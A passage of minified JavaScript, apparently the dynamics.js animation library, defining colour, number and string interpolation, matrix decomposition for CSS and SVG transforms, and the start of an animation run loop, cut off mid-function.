(function(){var Color,DecomposedMatrix,DecomposedMatrix2D,InterpolableArray,InterpolableColor,InterpolableNumber,InterpolableObject,InterpolableString,Matrix,Matrix2D,Set,Vector,addTimeout,animationTick,animations,animationsTimeouts,applyDefaults,applyFrame,applyProperties,baseSVG,cacheFn,cancelTimeout,clone,createInterpolable,defaultValueForKey,degProperties,dynamics,getCurrentProperties,interpolate,isDocumentVisible,isSVGElement,lastTime,leftDelayForTimeout,makeArrayFn,observeVisibilityChange,parseProperties,prefixFor,propertyWithPrefix,pxProperties,rAF,roundf,runLoopPaused,runLoopRunning,runLoopTick,setRealTimeout,slow,slowRatio,startAnimation,startRunLoop,svgProperties,timeBeforeVisibilityChange,timeoutLastId,timeouts,toDashed,transformProperties,transformValueForProperty,unitForProperty,fns,Bezier,Bezier_,yForX,__bind=function(fn,me){return function(){return fn.apply(me,arguments)}};isDocumentVisible=function(){return"visible"===document.visibilityState||null!=dynamics.tests},fns=[],"undefined"!=typeof document&&null!==document&&document.addEventListener("visibilitychange",(function(){var fn,_i,_len,_results;for(_results=[],_i=0,_len=fns.length;_i<_len;_i++)fn=fns[_i],_results.push(fn(isDocumentVisible()));return _results})),observeVisibilityChange=function(fn){return fns.push(fn)},clone=function(o){var k,newO,v;for(k in newO={},o)v=o[k],newO[k]=v;return newO},cacheFn=function(func){var data;return data={},function(){var key,result,_i,_len;for(key="",_i=0,_len=arguments.length;_i<_len;_i++)key+=arguments[_i].toString()+",";return(result=data[key])||(data[key]=result=func.apply(this,arguments)),result}},makeArrayFn=function(fn){return function(el){var args,i,res;return el instanceof Array||el instanceof NodeList||el instanceof HTMLCollection?(res=function(){var _i,_ref,_results;for(_results=[],i=_i=0,_ref=el.length;0<=_ref?_i<_ref:_i>_ref;i=0<=_ref?++_i:--_i)(args=Array.prototype.slice.call(arguments,1)).splice(0,0,el[i]),_results.push(fn.apply(this,args));return _results}.apply(this,arguments),res):fn.apply(this,arguments)}},applyDefaults=function(options,defaults){var k,v,_results;for(k in _results=[],defaults)v=defaults[k],_results.push(null!=options[k]?options[k]:options[k]=v);return _results},applyFrame=function(el,properties){var k,v,_results;if(null!=el.style)return applyProperties(el,properties);for(k in _results=[],properties)v=properties[k],_results.push(el[k]=v.format());return _results},applyProperties=function(el,properties){var isSVG,k,matrix,transforms,v;for(k in properties=parseProperties(properties),transforms=[],isSVG=isSVGElement(el),properties)v=properties[k],transformProperties.contains(k)?transforms.push([k,v]):(null!=v.format&&(v=v.format()),"number"==typeof v&&(v=""+v+unitForProperty(k,v)),isSVG&&svgProperties.contains(k)?el.setAttribute(k,v):el.style[propertyWithPrefix(k)]=v);if(transforms.length>0)return isSVG?((matrix=new Matrix2D).applyProperties(transforms),el.setAttribute("transform",matrix.decompose().format())):(v=transforms.map((function(transform){return transformValueForProperty(transform[0],transform[1])})).join(" "),el.style[propertyWithPrefix("transform")]=v)},isSVGElement=function(el){var _ref,_ref1;return"undefined"!=typeof SVGElement&&null!==SVGElement&&"undefined"!=typeof SVGSVGElement&&null!==SVGSVGElement?el instanceof SVGElement&&!(el instanceof SVGSVGElement):null!=(_ref=null!=(_ref1=dynamics.tests)&&"function"==typeof _ref1.isSVG?_ref1.isSVG(el):void 0)&&_ref},roundf=function(v,decimal){var d;return d=Math.pow(10,decimal),Math.round(v*d)/d},Set=function(){function Set(array){var v,_i,_len;for(this.obj={},_i=0,_len=array.length;_i<_len;_i++)v=array[_i],this.obj[v]=1}return Set.prototype.contains=function(v){return 1===this.obj[v]},Set}(),toDashed=function(str){return str.replace(/([A-Z])/g,(function($1){return"-"+$1.toLowerCase()}))},pxProperties=new Set("marginTop,marginLeft,marginBottom,marginRight,paddingTop,paddingLeft,paddingBottom,paddingRight,top,left,bottom,right,translateX,translateY,translateZ,perspectiveX,perspectiveY,perspectiveZ,width,height,maxWidth,maxHeight,minWidth,minHeight,borderRadius".split(",")),degProperties=new Set("rotate,rotateX,rotateY,rotateZ,skew,skewX,skewY,skewZ".split(",")),transformProperties=new Set("translate,translateX,translateY,translateZ,scale,scaleX,scaleY,scaleZ,rotate,rotateX,rotateY,rotateZ,rotateC,rotateCX,rotateCY,skew,skewX,skewY,skewZ,perspective".split(",")),svgProperties=new Set("accent-height,ascent,azimuth,baseFrequency,baseline-shift,bias,cx,cy,d,diffuseConstant,divisor,dx,dy,elevation,filterRes,fx,fy,gradientTransform,height,k1,k2,k3,k4,kernelMatrix,kernelUnitLength,letter-spacing,limitingConeAngle,markerHeight,markerWidth,numOctaves,order,overline-position,overline-thickness,pathLength,points,pointsAtX,pointsAtY,pointsAtZ,r,radius,rx,ry,seed,specularConstant,specularExponent,stdDeviation,stop-color,stop-opacity,strikethrough-position,strikethrough-thickness,surfaceScale,target,targetX,targetY,transform,underline-position,underline-thickness,viewBox,width,x,x1,x2,y,y1,y2,z".split(",")),unitForProperty=function(k,v){return"number"!=typeof v?"":pxProperties.contains(k)?"px":degProperties.contains(k)?"deg":""},transformValueForProperty=function(k,v){var match,unit;return null!=(match=(""+v).match(/^([0-9.-]*)([^0-9]*)$/))?(v=match[1],unit=match[2]):v=parseFloat(v),v=roundf(parseFloat(v),10),null!=unit&&""!==unit||(unit=unitForProperty(k,v)),k+"("+v+unit+")"},parseProperties=function(properties){var axis,match,parsed,property,value,_i,_len,_ref;for(property in parsed={},properties)if(value=properties[property],transformProperties.contains(property))if((match=property.match(/(translate|rotateC|rotate|skew|scale|perspective)(X|Y|Z|)/))&&match[2].length>0)parsed[property]=value;else for(_i=0,_len=(_ref=["X","Y","Z"]).length;_i<_len;_i++)axis=_ref[_i],parsed[match[1]+axis]=value;else parsed[property]=value;return parsed},defaultValueForKey=function(key){var v;return""+(v="opacity"===key?1:0)+unitForProperty(key,v)},getCurrentProperties=function(el,keys){var isSVG,key,matrix,properties,style,v,_i,_j,_len,_len1,_ref;if(properties={},isSVG=isSVGElement(el),null!=el.style)for(style=window.getComputedStyle(el,null),_i=0,_len=keys.length;_i<_len;_i++)key=keys[_i],transformProperties.contains(key)?null==properties.transform&&(matrix=isSVG?new Matrix2D(null!=(_ref=el.transform.baseVal.consolidate())?_ref.matrix:void 0):Matrix.fromTransform(style[propertyWithPrefix("transform")]),properties.transform=matrix.decompose()):(null==(v=style[key])&&svgProperties.contains(key)&&(v=el.getAttribute(key)),""!==v&&null!=v||(v=defaultValueForKey(key)),properties[key]=createInterpolable(v));else for(_j=0,_len1=keys.length;_j<_len1;_j++)properties[key=keys[_j]]=createInterpolable(el[key]);return properties},createInterpolable=function(value){var interpolable,klasses,_i,_len;for(_i=0,_len=(klasses=[InterpolableArray,InterpolableObject,InterpolableNumber,InterpolableString]).length;_i<_len;_i++)if(null!=(interpolable=klasses[_i].create(value)))return interpolable;return null},InterpolableString=function(){function InterpolableString(parts){this.parts=parts,this.format=__bind(this.format,this),this.interpolate=__bind(this.interpolate,this)}return InterpolableString.prototype.interpolate=function(endInterpolable,t){var end,i,newParts,start,_i,_ref;for(start=this.parts,end=endInterpolable.parts,newParts=[],i=_i=0,_ref=Math.min(start.length,end.length);0<=_ref?_i<_ref:_i>_ref;i=0<=_ref?++_i:--_i)null!=start[i].interpolate?newParts.push(start[i].interpolate(end[i],t)):newParts.push(start[i]);return new InterpolableString(newParts)},InterpolableString.prototype.format=function(){return this.parts.map((function(val){return null!=val.format?val.format():val})).join("")},InterpolableString.create=function(value){var index,match,matches,parts,re,type,types,_i,_j,_len,_len1;for(value=""+value,matches=[],_i=0,_len=(types=[{re:/(#[a-f\d]{3,6})/gi,klass:InterpolableColor,parse:function(v){return v}},{re:/(rgba?\([0-9.]*, ?[0-9.]*, ?[0-9.]*(?:, ?[0-9.]*)?\))/gi,klass:InterpolableColor,parse:function(v){return v}},{re:/([-+]?[\d.]+)/gi,klass:InterpolableNumber,parse:parseFloat}]).length;_i<_len;_i++)for(re=(type=types[_i]).re;match=re.exec(value);)matches.push({index:match.index,length:match[1].length,interpolable:type.klass.create(type.parse(match[1]))});for(parts=[],index=0,_j=0,_len1=(matches=matches.sort((function(a,b){return a.index>b.index}))).length;_j<_len1;_j++)(match=matches[_j]).index<index||(match.index>index&&parts.push(value.substring(index,match.index)),parts.push(match.interpolable),index=match.index+match.length);return index<value.length&&parts.push(value.substring(index)),new InterpolableString(parts)},InterpolableString}(),InterpolableObject=function(){function InterpolableObject(obj){this.format=__bind(this.format,this),this.interpolate=__bind(this.interpolate,this),this.obj=obj}return InterpolableObject.prototype.interpolate=function(endInterpolable,t){var end,k,newObj,start,v;for(k in start=this.obj,end=endInterpolable.obj,newObj={},start)null!=(v=start[k]).interpolate?newObj[k]=v.interpolate(end[k],t):newObj[k]=v;return new InterpolableObject(newObj)},InterpolableObject.prototype.format=function(){return this.obj},InterpolableObject.create=function(value){var k,obj,v;if(value instanceof Object){for(k in obj={},value)v=value[k],obj[k]=createInterpolable(v);return new InterpolableObject(obj)}return null},InterpolableObject}(),InterpolableNumber=function(){function InterpolableNumber(value){this.format=__bind(this.format,this),this.interpolate=__bind(this.interpolate,this),this.value=parseFloat(value)}return InterpolableNumber.prototype.interpolate=function(endInterpolable,t){var start;return start=this.value,new InterpolableNumber((endInterpolable.value-start)*t+start)},InterpolableNumber.prototype.format=function(){return roundf(this.value,5)},InterpolableNumber.create=function(value){return"number"==typeof value?new InterpolableNumber(value):null},InterpolableNumber}(),InterpolableArray=function(){function InterpolableArray(values){this.values=values,this.format=__bind(this.format,this),this.interpolate=__bind(this.interpolate,this)}return InterpolableArray.prototype.interpolate=function(endInterpolable,t){var end,i,newValues,start,_i,_ref;for(start=this.values,end=endInterpolable.values,newValues=[],i=_i=0,_ref=Math.min(start.length,end.length);0<=_ref?_i<_ref:_i>_ref;i=0<=_ref?++_i:--_i)null!=start[i].interpolate?newValues.push(start[i].interpolate(end[i],t)):newValues.push(start[i]);return new InterpolableArray(newValues)},InterpolableArray.prototype.format=function(){return this.values.map((function(val){return null!=val.format?val.format():val}))},InterpolableArray.createFromArray=function(arr){return new InterpolableArray(arr.map((function(val){return createInterpolable(val)||val})).filter((function(val){return null!=val})))},InterpolableArray.create=function(value){return value instanceof Array?InterpolableArray.createFromArray(value):null},InterpolableArray}(),Color=function(){function Color(rgb,format){this.rgb=null!=rgb?rgb:{},this.format=format,this.toRgba=__bind(this.toRgba,this),this.toRgb=__bind(this.toRgb,this),this.toHex=__bind(this.toHex,this)}return Color.fromHex=function(hex){var hex3,result;return null!=(hex3=hex.match(/^#([a-f\d]{1})([a-f\d]{1})([a-f\d]{1})$/i))&&(hex="#"+hex3[1]+hex3[1]+hex3[2]+hex3[2]+hex3[3]+hex3[3]),null!=(result=hex.match(/^#([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i))?new Color({r:parseInt(result[1],16),g:parseInt(result[2],16),b:parseInt(result[3],16),a:1},"hex"):null},Color.fromRgb=function(rgb){var match,_ref;return null!=(match=rgb.match(/^rgba?\(([0-9.]*), ?([0-9.]*), ?([0-9.]*)(?:, ?([0-9.]*))?\)$/))?new Color({r:parseFloat(match[1]),g:parseFloat(match[2]),b:parseFloat(match[3]),a:parseFloat(null!=(_ref=match[4])?_ref:1)},null!=match[4]?"rgba":"rgb"):null},Color.componentToHex=function(c){var hex;return 1===(hex=c.toString(16)).length?"0"+hex:hex},Color.prototype.toHex=function(){return"#"+Color.componentToHex(this.rgb.r)+Color.componentToHex(this.rgb.g)+Color.componentToHex(this.rgb.b)},Color.prototype.toRgb=function(){return"rgb("+this.rgb.r+", "+this.rgb.g+", "+this.rgb.b+")"},Color.prototype.toRgba=function(){return"rgba("+this.rgb.r+", "+this.rgb.g+", "+this.rgb.b+", "+this.rgb.a+")"},Color}(),InterpolableColor=function(){function InterpolableColor(color){this.color=color,this.format=__bind(this.format,this),this.interpolate=__bind(this.interpolate,this)}return InterpolableColor.prototype.interpolate=function(endInterpolable,t){var end,k,rgb,start,v,_i,_len,_ref;for(start=this.color,end=endInterpolable.color,rgb={},_i=0,_len=(_ref=["r","g","b"]).length;_i<_len;_i++)k=_ref[_i],v=Math.round((end.rgb[k]-start.rgb[k])*t+start.rgb[k]),rgb[k]=Math.min(255,Math.max(0,v));return k="a",v=roundf((end.rgb[k]-start.rgb[k])*t+start.rgb[k],5),rgb[k]=Math.min(1,Math.max(0,v)),new InterpolableColor(new Color(rgb,end.format))},InterpolableColor.prototype.format=function(){return"hex"===this.color.format?this.color.toHex():"rgb"===this.color.format?this.color.toRgb():"rgba"===this.color.format?this.color.toRgba():void 0},InterpolableColor.create=function(value){var color;if("string"==typeof value)return null!=(color=Color.fromHex(value)||Color.fromRgb(value))?new InterpolableColor(color):null},InterpolableColor}(),DecomposedMatrix2D=function(){function DecomposedMatrix2D(props){this.props=props,this.applyRotateCenter=__bind(this.applyRotateCenter,this),this.format=__bind(this.format,this),this.interpolate=__bind(this.interpolate,this)}return DecomposedMatrix2D.prototype.interpolate=function(endMatrix,t){var i,k,newProps,_i,_j,_k,_l,_len,_len1,_ref,_ref1,_ref2;for(newProps={},_i=0,_len=(_ref=["translate","scale","rotate"]).length;_i<_len;_i++)for(newProps[k=_ref[_i]]=[],i=_j=0,_ref1=this.props[k].length;0<=_ref1?_j<_ref1:_j>_ref1;i=0<=_ref1?++_j:--_j)newProps[k][i]=(endMatrix.props[k][i]-this.props[k][i])*t+this.props[k][i];for(i=_k=1;_k<=2;i=++_k)newProps.rotate[i]=endMatrix.props.rotate[i];for(_l=0,_len1=(_ref2=["skew"]).length;_l<_len1;_l++)newProps[k=_ref2[_l]]=(endMatrix.props[k]-this.props[k])*t+this.props[k];return new DecomposedMatrix2D(newProps)},DecomposedMatrix2D.prototype.format=function(){return"translate("+this.props.translate.join(",")+") rotate("+this.props.rotate.join(",")+") skewX("+this.props.skew+") scale("+this.props.scale.join(",")+")"},DecomposedMatrix2D.prototype.applyRotateCenter=function(rotateC){var i,m,negativeTranslate,_i,_results;for(m=(m=(m=(m=baseSVG.createSVGMatrix()).translate(rotateC[0],rotateC[1])).rotate(this.props.rotate[0])).translate(-rotateC[0],-rotateC[1]),negativeTranslate=new Matrix2D(m).decompose().props.translate,_results=[],i=_i=0;_i<=1;i=++_i)_results.push(this.props.translate[i]-=negativeTranslate[i]);return _results},DecomposedMatrix2D}(),baseSVG="undefined"!=typeof document&&null!==document?document.createElementNS("http://www.w3.org/2000/svg","svg"):void 0,Matrix2D=function(){function Matrix2D(m){this.m=m,this.applyProperties=__bind(this.applyProperties,this),this.decompose=__bind(this.decompose,this),this.m||(this.m=baseSVG.createSVGMatrix())}return Matrix2D.prototype.decompose=function(){var kx,ky,kz,r0,r1;return r0=new Vector([this.m.a,this.m.b]),r1=new Vector([this.m.c,this.m.d]),kx=r0.length(),kz=r0.dot(r1),r0=r0.normalize(),ky=r1.combine(r0,1,-kz).length(),new DecomposedMatrix2D({translate:[this.m.e,this.m.f],rotate:[180*Math.atan2(this.m.b,this.m.a)/Math.PI,this.rotateCX,this.rotateCY],scale:[kx,ky],skew:kz/ky*180/Math.PI})},Matrix2D.prototype.applyProperties=function(properties){var hash,k,props,v,_i,_len,_ref,_ref1;for(hash={},_i=0,_len=properties.length;_i<_len;_i++)hash[(props=properties[_i])[0]]=props[1];for(k in hash)v=hash[k],"translateX"===k?this.m=this.m.translate(v,0):"translateY"===k?this.m=this.m.translate(0,v):"scaleX"===k?this.m=this.m.scale(v,1):"scaleY"===k?this.m=this.m.scale(1,v):"rotateZ"===k?this.m=this.m.rotate(v):"skewX"===k?this.m=this.m.skewX(v):"skewY"===k&&(this.m=this.m.skewY(v));return this.rotateCX=null!=(_ref=hash.rotateCX)?_ref:0,this.rotateCY=null!=(_ref1=hash.rotateCY)?_ref1:0},Matrix2D}(),Vector=function(){function Vector(els){this.els=els,this.combine=__bind(this.combine,this),this.normalize=__bind(this.normalize,this),this.length=__bind(this.length,this),this.cross=__bind(this.cross,this),this.dot=__bind(this.dot,this),this.e=__bind(this.e,this)}return Vector.prototype.e=function(i){return i<1||i>this.els.length?null:this.els[i-1]},Vector.prototype.dot=function(vector){var V,n,product;if(V=vector.els||vector,product=0,(n=this.els.length)!==V.length)return null;for(n+=1;--n;)product+=this.els[n-1]*V[n-1];return product},Vector.prototype.cross=function(vector){var A,B;return B=vector.els||vector,3!==this.els.length||3!==B.length?null:new Vector([(A=this.els)[1]*B[2]-A[2]*B[1],A[2]*B[0]-A[0]*B[2],A[0]*B[1]-A[1]*B[0]])},Vector.prototype.length=function(){var a,e,_i,_len,_ref;for(a=0,_i=0,_len=(_ref=this.els).length;_i<_len;_i++)e=_ref[_i],a+=Math.pow(e,2);return Math.sqrt(a)},Vector.prototype.normalize=function(){var e,i,length,newElements,_ref;for(i in length=this.length(),newElements=[],_ref=this.els)e=_ref[i],newElements[i]=e/length;return new Vector(newElements)},Vector.prototype.combine=function(b,ascl,bscl){var i,result,_i,_ref;for(result=[],i=_i=0,_ref=this.els.length;0<=_ref?_i<_ref:_i>_ref;i=0<=_ref?++_i:--_i)result[i]=ascl*this.els[i]+bscl*b.els[i];return new Vector(result)},Vector}(),DecomposedMatrix=function(){function DecomposedMatrix(){this.toMatrix=__bind(this.toMatrix,this),this.format=__bind(this.format,this),this.interpolate=__bind(this.interpolate,this)}return DecomposedMatrix.prototype.interpolate=function(decomposedB,t,only){var angle,decomposed,i,invscale,invth,k,qa,qb,scale,th,_i,_j,_k,_l,_len,_ref,_ref1;for(null==only&&(only=null),this,decomposed=new DecomposedMatrix,_i=0,_len=(_ref=["translate","scale","skew","perspective"]).length;_i<_len;_i++)for(decomposed[k=_ref[_i]]=[],i=_j=0,_ref1=this[k].length-1;0<=_ref1?_j<=_ref1:_j>=_ref1;i=0<=_ref1?++_j:--_j)null==only||only.indexOf(k)>-1||only.indexOf(""+k+["x","y","z"][i])>-1?decomposed[k][i]=(decomposedB[k][i]-this[k][i])*t+this[k][i]:decomposed[k][i]=this[k][i];if(null==only||-1!==only.indexOf("rotate")){if(qa=this.quaternion,qb=decomposedB.quaternion,(angle=qa[0]*qb[0]+qa[1]*qb[1]+qa[2]*qb[2]+qa[3]*qb[3])<0){for(i=_k=0;_k<=3;i=++_k)qa[i]=-qa[i];angle=-angle}for(angle+1>.05?1-angle>=.05?(th=Math.acos(angle),invth=1/Math.sin(th),scale=Math.sin(th*(1-t))*invth,invscale=Math.sin(th*t)*invth):(scale=1-t,invscale=t):(qb[0]=-qa[1],qb[1]=qa[0],qb[2]=-qa[3],qb[3]=qa[2],scale=Math.sin(piDouble*(.5-t)),invscale=Math.sin(piDouble*t)),decomposed.quaternion=[],i=_l=0;_l<=3;i=++_l)decomposed.quaternion[i]=qa[i]*scale+qb[i]*invscale}else decomposed.quaternion=this.quaternion;return decomposed},DecomposedMatrix.prototype.format=function(){return this.toMatrix().toString()},DecomposedMatrix.prototype.toMatrix=function(){var i,j,match,matrix,quaternion,skew,temp,w,x,y,z,_i,_j,_k,_l;for(this,matrix=Matrix.I(4),i=_i=0;_i<=3;i=++_i)matrix.els[i][3]=this.perspective[i];for(x=(quaternion=this.quaternion)[0],y=quaternion[1],z=quaternion[2],w=quaternion[3],skew=this.skew,match=[[1,0],[2,0],[2,1]],i=_j=2;_j>=0;i=--_j)skew[i]&&((temp=Matrix.I(4)).els[match[i][0]][match[i][1]]=skew[i],matrix=matrix.multiply(temp));for(matrix=matrix.multiply(new Matrix([[1-2*(y*y+z*z),2*(x*y-z*w),2*(x*z+y*w),0],[2*(x*y+z*w),1-2*(x*x+z*z),2*(y*z-x*w),0],[2*(x*z-y*w),2*(y*z+x*w),1-2*(x*x+y*y),0],[0,0,0,1]])),i=_k=0;_k<=2;i=++_k){for(j=_l=0;_l<=2;j=++_l)matrix.els[i][j]*=this.scale[i];matrix.els[3][i]=this.translate[i]}return matrix},DecomposedMatrix}(),Matrix=function(){function Matrix(els){this.els=els,this.toString=__bind(this.toString,this),this.decompose=__bind(this.decompose,this),this.inverse=__bind(this.inverse,this),this.augment=__bind(this.augment,this),this.toRightTriangular=__bind(this.toRightTriangular,this),this.transpose=__bind(this.transpose,this),this.multiply=__bind(this.multiply,this),this.dup=__bind(this.dup,this),this.e=__bind(this.e,this)}return Matrix.prototype.e=function(i,j){return i<1||i>this.els.length||j<1||j>this.els[0].length?null:this.els[i-1][j-1]},Matrix.prototype.dup=function(){return new Matrix(this.els)},Matrix.prototype.multiply=function(matrix){var M,c,cols,elements,i,j,ki,kj,nc,ni,nj,returnVector,sum;for(returnVector=!!matrix.modulus,void 0===(M=matrix.els||matrix)[0][0]&&(M=new Matrix(M).els),ki=ni=this.els.length,kj=M[0].length,cols=this.els[0].length,elements=[],ni+=1;--ni;)for(elements[i=ki-ni]=[],nj=kj,nj+=1;--nj;){for(j=kj-nj,sum=0,nc=cols,nc+=1;--nc;)c=cols-nc,sum+=this.els[i][c]*M[c][j];elements[i][j]=sum}return M=new Matrix(elements),returnVector?M.col(1):M},Matrix.prototype.transpose=function(){var cols,elements,i,j,ni,nj,rows;for(rows=this.els.length,elements=[],ni=cols=this.els[0].length,ni+=1;--ni;)for(elements[i=cols-ni]=[],nj=rows,nj+=1;--nj;)j=rows-nj,elements[i][j]=this.els[j][i];return new Matrix(elements)},Matrix.prototype.toRightTriangular=function(){var M,els,i,j,k,kp,multiplier,n,np,p,_i,_j,_ref,_ref1;for(M=this.dup(),k=n=this.els.length,kp=this.els[0].length;--n;){if(i=k-n,0===M.els[i][i])for(j=_i=_ref=i+1;_ref<=k?_i<k:_i>k;j=_ref<=k?++_i:--_i)if(0!==M.els[j][i]){for(els=[],np=kp,np+=1;--np;)p=kp-np,els.push(M.els[i][p]+M.els[j][p]);M.els[i]=els;break}if(0!==M.els[i][i])for(j=_j=_ref1=i+1;_ref1<=k?_j<k:_j>k;j=_ref1<=k?++_j:--_j){for(multiplier=M.els[j][i]/M.els[i][i],els=[],np=kp,np+=1;--np;)p=kp-np,els.push(p<=i?0:M.els[j][p]-M.els[i][p]*multiplier);M.els[j]=els}}return M},Matrix.prototype.augment=function(matrix){var M,T,cols,i,j,ki,kj,ni,nj;if(void 0===(M=matrix.els||matrix)[0][0]&&(M=new Matrix(M).els),cols=(T=this.dup()).els[0].length,ki=ni=T.els.length,kj=M[0].length,ni!==M.length)return null;for(ni+=1;--ni;)for(i=ki-ni,nj=kj,nj+=1;--nj;)j=kj-nj,T.els[i][cols+j]=M[i][j];return T},Matrix.prototype.inverse=function(){var M,divisor,els,i,inverse_elements,j,ki,kp,new_element,ni,np,p,_i;for(ki=ni=this.els.length,kp=(M=this.augment(Matrix.I(ni)).toRightTriangular()).els[0].length,inverse_elements=[],ni+=1;--ni;){for(els=[],np=kp,inverse_elements[i=ni-1]=[],divisor=M.els[i][i],np+=1;--np;)p=kp-np,new_element=M.els[i][p]/divisor,els.push(new_element),p>=ki&&inverse_elements[i].push(new_element);for(M.els[i]=els,j=_i=0;0<=i?_i<i:_i>i;j=0<=i?++_i:--_i){for(els=[],np=kp,np+=1;--np;)p=kp-np,els.push(M.els[j][p]-M.els[i][p]*M.els[j][i]);M.els[j]=els}}return new Matrix(inverse_elements)},Matrix.I=function(n){var els,i,j,k,nj;for(els=[],k=n,n+=1;--n;)for(els[i=k-n]=[],nj=k,nj+=1;--nj;)j=k-nj,els[i][j]=i===j?1:0;return new Matrix(els)},Matrix.prototype.decompose=function(){var els,i,j,k,pdum3,perspective,perspectiveMatrix,quaternion,result,rightHandSide,rotate,row,rowElement,s,scale,skew,t,translate,type,typeKey,v,w,x,y,z,_i,_j,_k,_l,_m,_n,_o,_p,_q,_r;for(this,translate=[],scale=[],skew=[],[],perspective=[],els=[],i=_i=0;_i<=3;i=++_i)for(els[i]=[],j=_j=0;_j<=3;j=++_j)els[i][j]=this.els[i][j];if(0===els[3][3])return!1;for(i=_k=0;_k<=3;i=++_k)for(j=_l=0;_l<=3;j=++_l)els[i][j]/=els[3][3];for(perspectiveMatrix=this.dup(),i=_m=0;_m<=2;i=++_m)perspectiveMatrix.els[i][3]=0;if(perspectiveMatrix.els[3][3]=1,0!==els[0][3]||0!==els[1][3]||0!==els[2][3]){for(rightHandSide=new Vector(els.slice(0,4)[3]),perspective=perspectiveMatrix.inverse().transpose().multiply(rightHandSide).els,i=_n=0;_n<=2;i=++_n)els[i][3]=0;els[3][3]=1}else perspective=[0,0,0,1];for(i=_o=0;_o<=2;i=++_o)translate[i]=els[3][i],els[3][i]=0;for(row=[],i=_p=0;_p<=2;i=++_p)row[i]=new Vector(els[i].slice(0,3));if(scale[0]=row[0].length(),row[0]=row[0].normalize(),skew[0]=row[0].dot(row[1]),row[1]=row[1].combine(row[0],1,-skew[0]),scale[1]=row[1].length(),row[1]=row[1].normalize(),skew[0]/=scale[1],skew[1]=row[0].dot(row[2]),row[2]=row[2].combine(row[0],1,-skew[1]),skew[2]=row[1].dot(row[2]),row[2]=row[2].combine(row[1],1,-skew[2]),scale[2]=row[2].length(),row[2]=row[2].normalize(),skew[1]/=scale[2],skew[2]/=scale[2],pdum3=row[1].cross(row[2]),row[0].dot(pdum3)<0)for(i=_q=0;_q<=2;i=++_q)for(scale[i]*=-1,j=_r=0;_r<=2;j=++_r)row[i].els[j]*=-1;for(typeKey in rowElement=function(index,elementIndex){return row[index].els[elementIndex]},(rotate=[])[1]=Math.asin(-rowElement(0,2)),0!==Math.cos(rotate[1])?(rotate[0]=Math.atan2(rowElement(1,2),rowElement(2,2)),rotate[2]=Math.atan2(rowElement(0,1),rowElement(0,0))):(rotate[0]=Math.atan2(-rowElement(2,0),rowElement(1,1)),rotate[1]=0),(t=rowElement(0,0)+rowElement(1,1)+rowElement(2,2)+1)>1e-4?(w=.25/(s=.5/Math.sqrt(t)),x=(rowElement(2,1)-rowElement(1,2))*s,y=(rowElement(0,2)-rowElement(2,0))*s,z=(rowElement(1,0)-rowElement(0,1))*s):rowElement(0,0)>rowElement(1,1)&&rowElement(0,0)>rowElement(2,2)?(x=.25*(s=2*Math.sqrt(1+rowElement(0,0)-rowElement(1,1)-rowElement(2,2))),y=(rowElement(0,1)+rowElement(1,0))/s,z=(rowElement(0,2)+rowElement(2,0))/s,w=(rowElement(2,1)-rowElement(1,2))/s):rowElement(1,1)>rowElement(2,2)?(s=2*Math.sqrt(1+rowElement(1,1)-rowElement(0,0)-rowElement(2,2)),x=(rowElement(0,1)+rowElement(1,0))/s,y=.25*s,z=(rowElement(1,2)+rowElement(2,1))/s,w=(rowElement(0,2)-rowElement(2,0))/s):(s=2*Math.sqrt(1+rowElement(2,2)-rowElement(0,0)-rowElement(1,1)),x=(rowElement(0,2)+rowElement(2,0))/s,y=(rowElement(1,2)+rowElement(2,1))/s,z=.25*s,w=(rowElement(1,0)-rowElement(0,1))/s),quaternion=[x,y,z,w],(result=new DecomposedMatrix).translate=translate,result.scale=scale,result.skew=skew,result.quaternion=quaternion,result.perspective=perspective,result.rotate=rotate,result)for(k in type=result[typeKey])v=type[k],isNaN(v)&&(type[k]=0);return result},Matrix.prototype.toString=function(){var i,j,str,_i,_j;for(str="matrix3d(",i=_i=0;_i<=3;i=++_i)for(j=_j=0;_j<=3;j=++_j)str+=roundf(this.els[i][j],10),3===i&&3===j||(str+=",");return str+=")"},Matrix.matrixForTransform=cacheFn((function(transform){var matrixEl,result,style,_ref,_ref1,_ref2;return(matrixEl=document.createElement("div")).style.position="absolute",matrixEl.style.visibility="hidden",matrixEl.style[propertyWithPrefix("transform")]=transform,document.body.appendChild(matrixEl),result=null!=(_ref=null!=(_ref1=(style=window.getComputedStyle(matrixEl,null)).transform)?_ref1:style[propertyWithPrefix("transform")])?_ref:null!=(_ref2=dynamics.tests)?_ref2.matrixForTransform(transform):void 0,document.body.removeChild(matrixEl),result})),Matrix.fromTransform=function(transform){var digits,elements,i,match,matrixElements,_i;for(elements=(match=null!=transform?transform.match(/matrix3?d?\(([-0-9,e \.]*)\)/):void 0)?6===(digits=(digits=match[1].split(",")).map(parseFloat)).length?[digits[0],digits[1],0,0,digits[2],digits[3],0,0,0,0,1,0,digits[4],digits[5],0,1]:digits:[1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1],matrixElements=[],i=_i=0;_i<=3;i=++_i)matrixElements.push(elements.slice(4*i,4*i+4));return new Matrix(matrixElements)},Matrix}(),prefixFor=cacheFn((function(property){var k,prefix,prop,propArray,propertyName,_i,_j,_len,_len1,_ref;if(void 0!==document.body.style[property])return"";for(propertyName="",_i=0,_len=(propArray=property.split("-")).length;_i<_len;_i++)propertyName+=(prop=propArray[_i]).substring(0,1).toUpperCase()+prop.substring(1);for(_j=0,_len1=(_ref=["Webkit","Moz","ms"]).length;_j<_len1;_j++)if(k=(prefix=_ref[_j])+propertyName,void 0!==document.body.style[k])return prefix;return""})),propertyWithPrefix=cacheFn((function(property){var prefix;return"Moz"===(prefix=prefixFor(property))?""+prefix+(property.substring(0,1).toUpperCase()+property.substring(1)):""!==prefix?"-"+prefix.toLowerCase()+"-"+toDashed(property):toDashed(property)})),rAF="undefined"!=typeof window&&null!==window?window.requestAnimationFrame:void 0,animations=[],animationsTimeouts=[],slow=!1,slowRatio=1,"undefined"!=typeof window&&null!==window&&window.addEventListener("keyup",(function(e){if(68===e.keyCode&&e.shiftKey&&e.ctrlKey)return dynamics.toggleSlow()})),null==rAF&&(lastTime=0,rAF=function(callback){var currTime,id,timeToCall;return currTime=Date.now(),timeToCall=Math.max(0,16-(currTime-lastTime)),id=window.setTimeout((function(){return callback(currTime+timeToCall)}),timeToCall),lastTime=currTime+timeToCall,id}),runLoopRunning=!1,runLoopPaused=!1,startRunLoop=function(){if(!runLoopRunning)return runLoopRunning=!0,rAF(runLoopTick)},runLoopTick=function(t){var 